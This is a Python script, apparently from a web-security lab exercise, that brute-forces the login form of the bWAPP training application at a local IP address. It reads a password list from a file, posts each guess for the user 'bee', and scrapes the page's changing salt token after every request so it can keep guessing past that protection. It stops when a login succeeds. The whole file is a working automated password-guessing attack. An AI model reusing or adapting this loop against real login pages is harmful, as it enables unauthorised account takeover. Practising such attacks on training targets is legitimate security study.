import requests
from bs4 import BeautifulSoup as bs   #将模块重命名
import re
from concurrent.futures import ThreadPoolExecutor,wait
import time
import os
import sys


#获取salt值

url = 'http://10.60.17.148/bWAPP/ba_pwd_attacks_2.php' # 定义URL
headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; LCTE; rv:11.0) like Gecko',
'Cookie':'PHPSESSID=7582f68d7e7a4744013b9d3af6d240fc;security_level=1'}
#构造请求表单
lists = []         #定义列表保存密码列表
bee = 'bee'     #用户名
aa = 2
submit = 4
Info = ''
X = 1
salt = 3        #保存随机盐
while X:

        #打开文件并按行读取其中的内容
    with open('TOP10.txt','r') as f :
        for line in f:
            #获取每一行的数据
            lists.append(list(line.strip('\n').split(',')))      #将每一行的数据添加到列表中



    for i in lists:
        i = str(i)      #将列表类型的元素转化为字符串类型
        i = i.strip("['']")     #去掉字符串前后的 ['']

        print(i,salt)

        data = {
            "login":bee,
            "password":i,
            "salt":salt,
            "form":submit
        }


        r = requests.post(url=url, headers=headers,data=data)  # 请求目标网址
        soup = bs(r.content, 'lxml')  # 利用BS解析网址



        salt = soup.find(name='input',id='salt')['value']  # 利用bs提取标签为a，属性class为None的所有内容
        Info = soup.find_all(name = 'font', color  = 'red')
        Info = str(Info)
        if 'Incorrect' in Info or 'Did you forgot your password' in Info:
            X = True
            print("登录失败")
            print(data)

        else:
            X = False
            print("登录成功,密码是：",i)
            break





